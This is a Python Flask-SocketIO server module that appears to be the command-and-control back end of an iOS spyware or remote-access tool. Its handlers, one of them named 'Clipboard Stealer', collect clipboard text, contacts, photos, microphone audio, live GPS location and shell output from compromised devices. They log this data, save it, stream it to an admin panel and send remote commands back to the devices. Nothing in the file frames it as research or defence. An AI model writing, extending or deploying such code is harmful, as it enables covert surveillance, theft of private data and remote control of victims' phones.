"""
WebSocket Routes
Socket.IO event handlers
"""

import json
import os
import base64
from datetime import datetime, timezone
from flask import request
from flask_socketio import emit, disconnect
from app.auth import (
    verify_token,
    require_socket_auth,
    add_authenticated_session,
    remove_authenticated_session
)
from app.middleware import validate_identify_data, sanitize_string, validate_command
from app.utils import logger, log_connection, log_command

_PHOTOS_DIR = os.path.realpath('data/photos')
_AUDIO_DIR = os.path.realpath('data/audio')


def _safe_path(base_dir: str, filename: str) -> str:
    """Resolve path and verify it stays inside base_dir."""
    full = os.path.realpath(os.path.join(base_dir, filename))
    if not full.startswith(base_dir + os.sep) and full != base_dir:
        raise ValueError(f"Path traversal attempt: {filename!r}")
    return full


def init_socket_handlers(socketio, app, db, Device, Log, connected_devices):
    """Initialize all socket event handlers"""

    @socketio.on('join_admin')
    def handle_join_admin():
        from flask_socketio import join_room
        join_room('admin')

    @socketio.on('connect')
    def handle_connect():
        """New WebSocket connection"""
        session_id = request.sid
        client_ip = request.remote_addr

        log_connection('CONNECT', session_id, client_ip)

        connected_devices[session_id] = {
            'session_id': session_id,
            'ip': client_ip,
            'connected_at': datetime.now(timezone.utc).isoformat(),
            'authenticated': False,
            'identified': False,
            'device_id': None
        }

        emit('server_message', {
            'message': 'Connected. Please authenticate.',
            'session_id': session_id
        })


    @socketio.on('disconnect')
    def handle_disconnect():
        """WebSocket disconnection"""
        session_id = request.sid

        device_info = connected_devices.pop(session_id, {})
        device_id = device_info.get('device_id', 'Unknown')

        remove_authenticated_session(session_id)
        log_connection('DISCONNECT', session_id, request.remote_addr, device_id)

        # Emit only to the admin room, not to all connected clients
        socketio.emit('device_disconnected', {'session_id': session_id}, room='admin')


    @socketio.on('authenticate')
    def handle_authenticate(data):
        """JWT authentication over WebSocket"""
        session_id = request.sid
        token = data.get('token')

        if not token:
            emit('auth_error', {'error': 'Token required'})
            logger.warning(f"[AUTH] No token from {session_id}")
            return

        payload = verify_token(token)

        if not payload:
            emit('auth_error', {'error': 'Invalid or expired token'})
            logger.warning(f"[AUTH] Invalid token from {session_id}")
            disconnect()
            return

        device_id = payload.get('device_id')

        add_authenticated_session(session_id)

        if session_id in connected_devices:
            connected_devices[session_id]['authenticated'] = True
            connected_devices[session_id]['device_id'] = device_id

        logger.info(f"[AUTH] Success: {device_id} (session: {session_id})")

        emit('auth_success', {
            'message': 'Authentication successful',
            'device_id': device_id
        })


    @socketio.on('identify')
    @require_socket_auth
    def handle_identify(data):
        """Device identification"""
        session_id = request.sid

        # Sanitize input
        data = validate_identify_data(data)
        device_id = data.get('device_id', 'unknown')

        logger.info(f"[IDENTIFY] {device_id} | {data.get('device_name')} | iOS {data.get('system_version')}")

        with app.app_context():
            device = db.session.query(Device).filter_by(device_name=device_id).first()

            if not device:
                device = Device(
                    device_name=device_id,
                    ip_address=request.remote_addr,
                    first_seen=datetime.now(timezone.utc)
                )
                db.session.add(device)
                logger.info(f"[IDENTIFY] New device registered: {device_id}")

            device.update_info(data)
            device.ip_address = request.remote_addr
            db.session.commit()

        connected_devices[session_id] = {
            'session_id': session_id,
            'device_id': device_id,
            'ip': request.remote_addr,
            'connected_at': datetime.now(timezone.utc).isoformat(),
            'authenticated': True,
            'identified': True,
            'info': data
        }

        emit('server_message', {'message': f'Device {device_id} registered'})
        socketio.emit('device_connected', connected_devices[session_id], room='admin')


    # Plugin event handlers

    @socketio.on('Clipboard Stealer')
    @require_socket_auth
    def handle_clipboard(data):
        device_id = data.get('device_id', 'unknown')
        clipboard = sanitize_string(data.get('clipboard', ''), 10000)

        logger.info(f"[DATA] Clipboard from {device_id}: {len(clipboard)} chars")
        save_log(db, Device, Log, device_id, 'Clipboard Stealer', clipboard)
        emit('server_message', {'message': 'Clipboard received'})
        socketio.emit('plugin_data', {
            'plugin': 'clipboard', 'device_id': device_id,
            'data': {'text': clipboard}
        }, room='admin')


    @socketio.on('System Info')
    @require_socket_auth
    def handle_system_info(data):
        device_id = data.get('device_id', 'unknown')

        logger.info(f"[DATA] System info from {device_id}")
        save_log(db, Device, Log, device_id, 'System Info', json.dumps(data))
        emit('server_message', {'message': 'System info received'})
        socketio.emit('plugin_data', {
            'plugin': 'sysinfo', 'device_id': device_id,
            'data': data
        }, room='admin')


    @socketio.on('Location Data')
    @require_socket_auth
    def handle_location(data):
        device_id = data.get('device_id', 'unknown')
        lat = data.get('latitude', 0)
        lon = data.get('longitude', 0)

        logger.info(f"[DATA] Location from {device_id}: {lat}, {lon}")
        save_log(db, Device, Log, device_id, 'Location Data', json.dumps({'lat': lat, 'lon': lon}))
        emit('server_message', {'message': 'Location received'})
        socketio.emit('plugin_data', {
            'plugin': 'location', 'device_id': device_id,
            'data': {'lat': lat, 'lon': lon,
                     'altitude': data.get('altitude', 0),
                     'accuracy': data.get('accuracy', 0),
                     'speed': data.get('speed', 0)}
        }, room='admin')


    @socketio.on('Contacts Data')
    @require_socket_auth
    def handle_contacts(data):
        device_id = data.get('device_id', 'unknown')
        contacts = data.get('contacts', [])

        logger.info(f"[DATA] Contacts from {device_id}: {len(contacts)} entries")
        save_log(db, Device, Log, device_id, 'Contacts Data', json.dumps(contacts))
        emit('server_message', {'message': f'{len(contacts)} contacts received'})
        socketio.emit('plugin_data', {
            'plugin': 'contacts', 'device_id': device_id,
            'data': {'contacts': contacts, 'count': len(contacts)}
        }, room='admin')


    @socketio.on('Photo Data')
    @require_socket_auth
    def handle_photo(data):
        device_id = data.get('device_id', 'unknown')
        photo_base64 = data.get('photo', '')

        logger.info(f"[DATA] Photo from {device_id}: {len(photo_base64)} bytes")

        filename = ""
        if photo_base64:
            timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            try:
                os.makedirs(_PHOTOS_DIR, exist_ok=True)
                safe_name = f"{sanitize_string(device_id, 50)}_{timestamp}.jpg"
                filepath = _safe_path(_PHOTOS_DIR, safe_name)
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(photo_base64))
                filename = filepath
                logger.info(f"[DATA] Photo saved: {filepath}")
            except Exception as e:
                logger.error(f"[DATA] Photo save error: {e}")
                emit('error', {'message': f'Photo save failed: {e}'})

        save_log(db, Device, Log, device_id, 'Photo Data', f"Photo: {filename}" if filename else "Empty")
        emit('server_message', {'message': 'Photo received'})
        socketio.emit('plugin_data', {
            'plugin': 'photo', 'device_id': device_id,
            'data': {'photo_b64': photo_base64, 'camera': data.get('camera', 'unknown')}
        }, room='admin')


    @socketio.on('Audio Data')
    @require_socket_auth
    def handle_audio(data):
        device_id = data.get('device_id', 'unknown')
        audio_base64 = data.get('audio', '')

        logger.info(f"[DATA] Audio from {device_id}: {len(audio_base64)} bytes")

        if audio_base64:
            timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            try:
                os.makedirs(_AUDIO_DIR, exist_ok=True)
                safe_name = f"{sanitize_string(device_id, 50)}_{timestamp}.m4a"
                filepath = _safe_path(_AUDIO_DIR, safe_name)
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(audio_base64))
            except Exception as e:
                logger.error(f"[DATA] Audio save error: {e}")
                emit('error', {'message': f'Audio save failed: {e}'})

        save_log(db, Device, Log, device_id, 'Audio Data', f"Audio: {len(audio_base64)} bytes")
        socketio.emit('plugin_data', {
            'plugin': 'audio', 'device_id': device_id,
            'data': {'audio_b64': audio_base64}
        }, room='admin')
        emit('server_message', {'message': 'Audio received'})


    @socketio.on('Live Location')
    @require_socket_auth
    def handle_live_location(data):
        device_id = data.get('device_id', 'unknown')
        lat = data.get('latitude', 0)
        lon = data.get('longitude', 0)

        logger.info(f"[LIVE] Location from {device_id}: {lat}, {lon}")
        save_log(db, Device, Log, device_id, 'Live Location', json.dumps(data))
        socketio.emit('plugin_data', {
            'plugin': 'location', 'device_id': device_id,
            'data': {'lat': lat, 'lon': lon,
                     'altitude': data.get('altitude', 0),
                     'accuracy': data.get('accuracy', 0),
                     'speed': data.get('speed', 0)}
        }, room='admin')


    @socketio.on('Shell Output')
    @require_socket_auth
    def handle_shell_output(data):
        device_id = data.get('device_id', 'unknown')
        output = data.get('output', '')
        command = data.get('command', '')

        logger.info(f"[DATA] Shell from {device_id}: {command}")
        save_log(db, Device, Log, device_id, 'Shell Output', json.dumps({
            'command': command,
            'output': output
        }))
        emit('server_message', {'message': 'Shell output received'})


    @socketio.on('administrate')
    @require_socket_auth
    def handle_admin(data):
        """Admin command from panel"""
        command = data.get('command')
        target_device = data.get('device_id')
        params = data.get('params', {})

        if not command:
            emit('error', {'message': 'Command is required'})
            return

        if not validate_command(command):
            emit('error', {'message': f'Invalid command: {command}'})
            logger.warning(f"[ADMIN] Invalid command rejected: {command!r}")
            return

        log_command(command, target_device, 'admin_panel')

        if target_device and command:
            send_command(socketio, connected_devices, target_device, command, params)


def save_log(db, Device, Log, device_id: str, plugin_name: str, data: str):
    """Save log to database"""
    try:
        device = db.session.query(Device).filter_by(device_name=device_id).first()

        if device:
            log = Log(
                device_id=device.id,
                plugin_name=plugin_name,
                data=data,
                data_size=len(data) if data else 0,
                timestamp=datetime.now(timezone.utc)
            )
            db.session.add(log)
            db.session.commit()
    except Exception as e:
        logger.error(f"[DB] Log save error: {e}")


def send_command(socketio, connected_devices, device_id: str, command: str, params: dict = None):
    """Send command to a specific device"""
    for session_id, info in connected_devices.items():
        if info.get('device_id') == device_id and info.get('authenticated'):
            payload = {'command': command, 'params': params or {}}
            socketio.emit('execute_command', payload, room=session_id)
            logger.info(f"[CMD] Sent: {command} -> {device_id}")
            return True

    logger.warning(f"[CMD] Device offline: {device_id}")
    return False
